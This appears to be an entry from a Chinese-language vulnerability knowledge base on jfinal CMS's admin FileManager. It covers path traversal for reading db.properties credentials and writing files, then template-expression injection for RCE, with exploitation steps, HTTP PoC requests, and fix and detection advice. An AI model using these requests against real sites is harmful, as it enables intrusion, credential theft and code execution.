---
id: web-java-component-filemanager-arbitrary-read-write-path-traversal-jfinal-filter
title: jfinal cms FileManager：path/currentpath 未过滤导致任意文件读/写/下载，jsp 直连被 JFinalFilter 404 后靠改写模板拿 RCE
type: scenario
domain: web
path: web/java/component
technique: jfinalcms-filemanager-path-traversal-read-write
aliases:
- jfinal cms 文件管理器 任意文件读取
- currentpath 目录穿越
- JFinalFilter denyAccessJsp
- 后台模板改写 RCE
- filemanager savefile
tags:
- java
- file-manager
- path-traversal
- arbitrary-file-read
- arbitrary-file-write
- cms
- jfinal
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T12:05:24+08:00'
  notes: 已对照原文核对：editfile 读 /web-inf/classes/conf/db.properties 的请求与响应（含 mysql.user/mysql.password）见原文截图、download 与 add 走 new File(getRealFilePath()) 无过滤、currentpath 经 ISO8859-1→UTF-8 转码拼接、JFinalFilter denyAccessJsp 使 .jsp 直连 404 但文件已落地，均与原文一致；已修正写文件入口表述（原文实际是上传 mode=add + 界面 Replace file 覆写，mode=savefile 属组件版本变体并标注原文未演示）；未设 affected_versions
---

## 一句话结论

jfinal cms 后台的 `FileManagerController` 把请求里的 `path`、`currentpath` 直接交给 `FileManager.getRealFilePath()` 拼真实路径，`mode=editfile` 读内容、`mode=download` 下载、`mode=add/savefile` 写文件都不过滤 `../`；因此可读 `WEB-INF/classes/conf/db.properties` 拿数据库口令、写任意文件；直接上传 `.jsp` 虽被 `JFinalFilter` 的 `denyAccessJsp` 拦成 404，但把内容写进 `.html` 模板文件（模板引擎会对 `${...}` 求值）即可绕过该拦截达成 RCE。

## 原理

- **`getRealFilePath()` 只做拼接**：`fileRoot + path`（或把 `currentPath` 经 ISO-8859-1→UTF-8 转码后拼进去）就交给 `new File(...)`，没有 `normalize`、没有 `startsWith(fileRoot)` 校验，`../` 一路向上即跳出 Web 目录甚至跳到磁盘任意位置。
- **三个 mode 都受影响**：`editfile` 走 `FileManagerUtils.readString(getRealFilePath())` 并把结果 base64/HTML 编码后放进 JSON；`download` 走 `new File(getRealFilePath())` 再 `readFile(resp, file)`；`add`/`savefile` 走 `new File(path + filename)` 的 `FileOutputStream`——读写两侧都没有权限/路径约束。
- **为什么能读配置**：`/web-inf/classes/conf/db.properties` 是小写路径，落在 Tomcat 解包后的 `WEB-INF/classes/conf/` 下；由于拼接后仍能命中真实文件（Windows 上大小写不敏感、Linux 上原文用全小写正是为了在区分大小写的文件系统上也命中），一次 GET 就把 `mysql.user`/`mysql.password` 读出来。
- **jsp 上传为什么失败**：`JFinalFilter` 在分发前做了 `if (constants.getDenyAccessJsp() && isJsp(target)) { renderError404(); return; }`，`isJsp()` 按扩展名倒着判 `j/x/p/s/./...`，所以 `.jsp`、`.jspx` 一律 404——但那只是“**直接访问**被拦”，文件本身已经落到磁盘。
- **绕过思路**：拦截点是“URL 以 jsp 结尾”，不是“文件内容”。把 payload 写进 `.html` 模板（或任何被模板引擎解析的文件）后访问该页面，模板引擎会把 `${@...}`/`${...}` 求值；再配合本批次的 Beetl 静态类反射卡，就能从“写文件”走到“执行命令”（原文实测在后台模板里写 beetl 表达式即弹出计算器）。
- **附加面**：上传时的 `currentpath` 也是可控变量，可把文件写到 `WEB-INF/classes/`、`static/` 以外的位置；配合 `savefile` 可以直接覆盖 `web.xml`、`config.json`（`ueditor` 的 `config.json` 还会被 fastjson `parseObject` 解析，形成反序列化入口）。

## 触发条件

- jfinal cms 后台文件管理器可用（默认开启，入口 `/admin/filemanager`），攻击者已取得管理员会话（弱口令、XSS 借会话、或本批次的 SQL 注入读出的口令）。
- `fileRoot` 指向 Web 目录，`getRealFilePath()` 未做规范化/白名单。
- 需要读的目标文件进程可读（`db.properties`、`config.json`、`web.xml`、`/etc/passwd` 等）。
- 要落到 RCE 还需要一个“内容会被解析”的落点（模板文件、`config.json`、`web.xml` 等）。

## 利用步骤

1. 登录后台，打开模板管理/文件管理器的 list 页面，确认 `mode`、`path`、`currentpath`、`config`、`time` 等参数。
2. 读配置：`GET /admin/filemanager?mode=editfile&path=/web-inf/classes/conf/db.properties&config=filemanager.config.js&time=855`，响应 JSON 的 `Content` 字段就是文件内容。
3. 若目标大小写敏感导致不命中，改试 `path=../classes/conf/db.properties`、`path=/WEB-INF/classes/conf/db.properties`。
4. 下载二进制文件：`?mode=download&path=...`，响应头是 `application/force-download`。
5. 写文件：`POST /admin/filemanager`，multipart 里 `mode=add`、`currentpath=../jfinal_cms/upload`、`newfile` 的 filename 与内容（原文上传 `.jsp` 时 `currentpath` 可控即由该入口穿越）；已存在文件则用界面上的“Replace file/替换”覆写（原文覆盖 ueditor `config.json` 即走该功能）。`mode=savefile&path=...&content=...` 是部分 filemanager 组件版本的等价入口，原文未直接演示。
6. 落 RCE：把内容写到 `template/xxx.html` 之类的模板（写入 `${@...}` 表达式），访问对应页面触发；或覆盖 `ueditor` 的 `WEB-INF/classes/config.json` 为 fastjson 反序列化 payload，再访问 `/jfinal_cms/ueditor` 触发 `JSONObject.parseObject`。
7. 上传 `.jsp` 做对照验证：文件确实落地但访问返回 404（证明拦的是 URL 而非写入）。

## PoC

```http
# 1) 任意文件读取（读数据库配置）
GET /jfinal_cms/admin/filemanager?mode=editfile&path=/web-inf/classes/conf/db.properties&config=filemanager.config.js&time=855 HTTP/1.1
Host: target:8081
Cookie: JSESSIONID=...; session_user=...

# 响应：{"Path":"/web-inf/classes/conf/db.properties","Content":"...mysql.user = root\nmysql.password = 123456...","Error":"","Code":0}

# 2) 任意文件写（目录穿越 + 覆盖模板）
POST /jfinal_cms/admin/filemanager HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="mode"

add
--X
Content-Disposition: form-data; name="currentpath"

../jfinal_cms/template
--X
Content-Disposition: form-data; name="newfile"; filename="head.html"
Content-Type: text/html

${@java.lang.Class.forName("java.lang.Runtime")...}
--X--

# 3) 访问模板对应页面触发表达式求值
GET /jfinal_cms/home
```

## 变体与关联

- 变体：`mode=editfile` 返回的是 `encodeContent()` 后的内容（HTML 实体/编码），二进制文件会乱码；要下载原始字节改用 `mode=download`。
- 变体：`JFinalFilter` 的 `isJsp` 只判后缀，若目标部署把 `denyAccessJsp` 配成 false，则直接上传 `.jsp` 即可执行，不需要绕模板。
- 变体：`currentpath` 的 `getFilePath()` 若做了规范化，还可试 `%2e%2e%2f`、`..%5c`、绝对路径（Windows 盘符）等编码变体。
- 关联：本批次的 [[web-generic-ssti-beetl-static-class-reflect-runtime-blacklist-bypass]]（写模板后的执行链）、[[web-generic-sqli-jfinalcms-baseform-orderby-extractvalue]]（先拿管理员口令的前置）、[[web-java-component-halo-theme-savetpl-path-traversal-write]]（同类后台模板路径穿越写）。

## 检测与防御

- 修复：`getRealFilePath()` 必须 `new File(fileRoot, path).getCanonicalPath()` 后校验 `startsWith(canonicalFileRoot)`；`path`/`currentpath` 用白名单目录 + 文件名正则。
- 加固：文件管理器只允许在固定子目录内操作；禁止读写 `WEB-INF`、`META-INF`；模板文件纳入完整性监控。
- 检测：访问日志中 `mode=editfile|download|add|savefile` 且 `path` 含 `../`、`/web-inf`、`/WEB-INF`、盘符；后台会话在短时间内连续读多个配置文件；Web 目录出现 `.jsp` 但访问 404 的“落地未执行”痕迹。
- 响应：轮换数据库中读出的凭据、检查模板与 `config.json` 是否被改写、按“后台已失陷”排查后续利用。
